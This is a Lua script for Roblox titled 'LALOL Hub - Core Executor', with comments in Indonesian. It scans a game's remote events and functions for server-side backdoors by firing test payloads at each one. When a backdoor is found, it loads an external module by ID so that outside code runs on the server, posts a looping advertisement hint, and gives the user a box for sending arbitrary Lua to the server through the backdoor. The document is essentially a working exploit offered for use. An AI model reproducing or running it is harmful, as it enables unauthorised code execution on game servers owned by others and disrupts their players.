local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService") -- Digunakan untuk JSONEncode (walaupun log Discord saya hapus)

local player = Players.LocalPlayer

-- Global State untuk Backdoor yang Ditemukan
local backdoorRemote = nil -- RemoteEvent/RemoteFunction yang ditemukan oleh Scanner
local isGuiVisible = true -- Status visibilitas GUI

-- ===================================================================================
-- 🔽 ANIMASI INTRO (BY : Xraxor) 🔽
-- ===================================================================================
do
    local introGui = Instance.new("ScreenGui")
    introGui.Name = "IntroAnimation"
    introGui.ResetOnSpawn = false
    introGui.Parent = player:WaitForChild("PlayerGui")

    local introLabel = Instance.new("TextLabel")
    introLabel.Size = UDim2.new(0, 300, 0, 50)
    introLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
    introLabel.BackgroundTransparency = 1
    introLabel.Text = "LALOL Hub - Executor"
    introLabel.TextColor3 = Color3.fromRGB(40, 40, 40)
    introLabel.TextScaled = true
    introLabel.Font = Enum.Font.GothamBold
    introLabel.Parent = introGui

    local tweenInfoMove = TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
    local tweenMove = TweenService:Create(introLabel, tweenInfoMove, {Position = UDim2.new(0.5, -150, 0.42, 0)})

    local tweenInfoColor = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
    local tweenColor = TweenService:Create(introLabel, tweenInfoColor, {TextColor3 = Color3.fromRGB(200, 0, 0)}) -- Ubah warna menjadi lebih "LALOL"

    tweenMove:Play()
    tweenColor:Play()

    task.wait(2)
    local fadeOut = TweenService:Create(introLabel, TweenInfo.new(0.5), {TextTransparency = 1})
    fadeOut:Play()
    fadeOut.Completed:Connect(function()
        introGui:Destroy()
    end)
end

-- ===================================================================================
-- 🔽 FUNGSI UTILITY GLOBAL (Notifikasi dan Status Tombol) 🔽
-- ===================================================================================

local function showNotification(message)
    local notifGui = Instance.new("ScreenGui")
    notifGui.Name = "Notification"
    notifGui.ResetOnSpawn = false
    notifGui.Parent = player:WaitForChild("PlayerGui")

    local notifLabel = Instance.new("TextLabel")
    notifLabel.Size = UDim2.new(0, 400, 0, 50)
    notifLabel.Position = UDim2.new(0.5, -200, 0.1, 0)
    notifLabel.BackgroundTransparency = 1
    notifLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    notifLabel.Text = message
    notifLabel.TextColor3 = Color3.new(1, 1, 1)
    notifLabel.TextScaled = true
    notifLabel.Font = Enum.Font.GothamBold
    notifLabel.Parent = notifGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = notifLabel

    local fadeIn = TweenService:Create(notifLabel, TweenInfo.new(0.3), {TextTransparency = 0, BackgroundTransparency = 0.2, BackgroundColor3 = Color3.fromRGB(255, 0, 0)}) -- Warna Merah
    local fadeOut = TweenService:Create(notifLabel, TweenInfo.new(0.5), {TextTransparency = 1, BackgroundTransparency = 1})

    fadeIn:Play()
    fadeIn.Completed:Connect(function()
        task.wait(1.5)
        fadeOut:Play()
        fadeOut.Completed:Connect(function()
            notifGui:Destroy()
        end)
    end)
end

local function updateButtonStatus(button, isActive, featureName)
    if not button or not button.Parent then return end
    local name = featureName or button.Name:gsub("Button", ""):gsub("_", " "):upper()
    
    if isActive then
        button.Text = name .. ": ON"
        button.BackgroundColor3 = Color3.fromRGB(0, 180, 0) 
    else
        button.Text = name .. ": OFF"
        button.BackgroundColor3 = Color3.fromRGB(150, 0, 0) 
    end
end

-- ===================================================================================
-- 🔽 GUI UTAMA (Core Features) 🔽
-- ===================================================================================
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CoreFeaturesGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Frame utama (Diperbesar untuk Executor)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 480, 0, 350) -- Ukuran diperluas
frame.Position = UDim2.new(0.5, -240, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = frame

-- Judul GUI
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "LALOL HUB - CORE EXECUTOR"
title.TextColor3 = Color3.fromRGB(255, 0, 0) -- Warna Merah
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame

-- ScrollingFrame untuk Daftar Pilihan Fitur (Diubah menjadi wadah utama)
local featureContainer = Instance.new("Frame")
featureContainer.Name = "FeatureContainer"
featureContainer.Size = UDim2.new(1, -20, 1, -40)
featureContainer.Position = UDim2.new(0.5, -230, 0, 35)
featureContainer.BackgroundTransparency = 1
featureContainer.Parent = frame

-- ===================================================================================
-- 🔽 MODUL EXECUTOR (diadaptasi dari skrip pertama) 🔽
-- ===================================================================================

local ExecutorBox = Instance.new("TextBox")
ExecutorBox.Name = "ExecutorBox"
ExecutorBox.Size = UDim2.new(1, 0, 0, 220)
ExecutorBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ExecutorBox.TextColor3 = Color3.fromRGB(198, 119, 88)
ExecutorBox.PlaceholderText = "Masukkan kode Lua di sini..."
ExecutorBox.TextWrapped = true
ExecutorBox.MultiLine = true
ExecutorBox.TextSize = 14
ExecutorBox.Font = Enum.Font.SourceSans
ExecutorBox.Parent = featureContainer

local execCorner = Instance.new("UICorner")
execCorner.CornerRadius = UDim.new(0, 10)
execCorner.Parent = ExecutorBox

local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Name = "ExecuteButton"
ExecuteButton.Size = UDim2.new(0.6, 0, 0, 35)
ExecuteButton.Position = UDim2.new(0, 0, 0, 230)
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
ExecuteButton.Text = "EXECUTE"
ExecuteButton.TextColor3 = Color3.new(1, 1, 1)
ExecuteButton.Font = Enum.Font.GothamBold
ExecuteButton.TextSize = 18
ExecuteButton.Parent = featureContainer

local ClearButton = Instance.new("TextButton")
ClearButton.Name = "ClearButton"
ClearButton.Size = UDim2.new(0.35, 0, 0, 35)
ClearButton.Position = UDim2.new(0.65, 0, 0, 230)
ClearButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
ClearButton.Text = "CLEAR"
ClearButton.TextColor3 = Color3.new(1, 1, 1)
ClearButton.Font = Enum.Font.GothamBold
ClearButton.TextSize = 18
ClearButton.Parent = featureContainer

local ScannerButton = Instance.new("TextButton")
ScannerButton.Name = "ScannerButton"
ScannerButton.Size = UDim2.new(1, 0, 0, 35)
ScannerButton.Position = UDim2.new(0, 0, 0, 275)
ScannerButton.BackgroundColor3 = Color3.fromRGB(200, 200, 0)
ScannerButton.Text = "START BACKDOOR SCAN"
ScannerButton.TextColor3 = Color3.new(0, 0, 0)
ScannerButton.Font = Enum.Font.GothamBold
ScannerButton.TextSize = 18
ScannerButton.Parent = featureContainer

-- ===================================================================================
-- 🔽 FUNGSI LOGIKA (Eksekusi & Scanner) 🔽
-- ===================================================================================

local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        -- Untuk RemoteFunction, InvokeServer idealnya dijalankan dalam spawn/pcall
        spawn(function() 
            local success, result = pcall(remote.InvokeServer, remote, data)
            if not success then
                showNotification("Error InvokeServer: " .. tostring(result))
            end
        end)
    end
end

local function executeCode()
    if not backdoorRemote then
        showNotification("ERROR: Backdoor belum ditemukan. Jalankan scanner dulu!")
        return
    end

    local code = ExecutorBox.Text
    
    -- Ganti variabel pengganti
    local finalCode = string.gsub(code, '%%username%%', player.Name)
    
    ExecuteButton.Text = "EXECUTING..."
    ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)

    -- Coba Invoke Protected Backdoor (diadaptasi)
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        showNotification("Executing via Protected Backdoor...")
        spawn(function()
            local boolValue, variantValue = pcall(protected_backdoor:InvokeServer, protected_backdoor, 'lalol hub execute', finalCode)
            if variantValue ~= nil and type(variantValue) == "string" then
                local splited = string.split(variantValue,':')
                showNotification("Response: " .. splited[#splited])
            end
        end)
    else
        -- Eksekusi via Backdoor Umum
        showNotification("Executing via Found Backdoor...")
        runRemote(backdoorRemote, finalCode)
    end

    task.wait(0.5)
    ExecuteButton.Text = "EXECUTED!"
    ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
    task.wait(0.5)
    ExecuteButton.Text = "EXECUTE"
    ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
end

local function generateName(length)
    local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
    local text = ''
    for i=1, length do
        text = text .. alphabet[math.random(1,#alphabet)]
    end
    return text
end

local function findRemote()
    if ScannerButton.Text == "SCANNING..." then return end -- Mencegah double click
    
    ScannerButton.Text = "SCANNING..."
    ScannerButton.BackgroundColor3 = Color3.fromRGB(255, 100, 0) -- Orange
    
    local remotes = {}
    local timee = os.clock()
    local found = false

    -- Logika Scanner (Diadaptasi dari skrip pertama, tanpa Discord Log)
    for _, remote in game:GetDescendants() do
        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
            -- Filter keamanan
            if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' or 
               (remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents') or 
               (remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient') or
               remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
                continue -- Lewati remote yang dianggap aman
            end

            -- Kirim payload untuk pengetesan backdoor
            local code = generateName(math.random(12,30))
            remotes[code] = remote
            runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        end
    end

    -- Checker (Looping Cepat)
    for i=1, 50 do
        for code, remote in remotes do
            if workspace:FindFirstChild(code) then
                showNotification('Backdoor found! ' .. string.format("%.2f", os.clock() - timee) .. 's')
                backdoorRemote = remote
                ScannerButton.Text = "BACKDOOR FOUND: " .. remote.Name
                ScannerButton.BackgroundColor3 = Color3.fromRGB(0, 180, 0) -- Hijau
                
                -- Kirim payload untuk inisialisasi backdoor (diadaptasi)
                runRemote(remote, "require(171016405.1884*69)")			
                runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                
                found = true
                break
            end
        end
        if found then break end
        task.wait(0.1)
    end

    if not found then
        showNotification("Scanner selesai. Tidak ada backdoor yang terdeteksi.")
        ScannerButton.Text = "NO BACKDOOR FOUND :("
        ScannerButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
        task.wait(1)
        ScannerButton.Text = "START BACKDOOR SCAN"
        ScannerButton.BackgroundColor3 = Color3.fromRGB(200, 200, 0)
    end
end


-- ===================================================================================
-- 🔽 KONEKSI EVENT 🔽
-- ===================================================================================

ExecuteButton.MouseButton1Click:Connect(executeCode)

ClearButton.MouseButton1Click:Connect(function()
    ExecutorBox.Text = ''
    ClearButton.Text = 'CLEARED!'
    ClearButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    task.wait(0.5)
    ClearButton.Text = 'CLEAR'
    ClearButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
end)

ScannerButton.MouseButton1Click:Connect(findRemote)

-- Toggle Visibility
UserInputService.InputBegan:Connect(function(input, processed)
    if (input.KeyCode == Enum.KeyCode.LeftAlt and not processed) then
        isGuiVisible = not isGuiVisible
        frame.Visible = isGuiVisible
    end
end)

-- *Note: Fungsi makeFeatureButton dan updateButtonStatus tidak digunakan dalam kode ini
-- karena GUI diubah menjadi fokus tunggal Executor. Anda dapat menggunakannya jika
-- ingin menambahkan tab atau tombol fitur lain di masa depan.
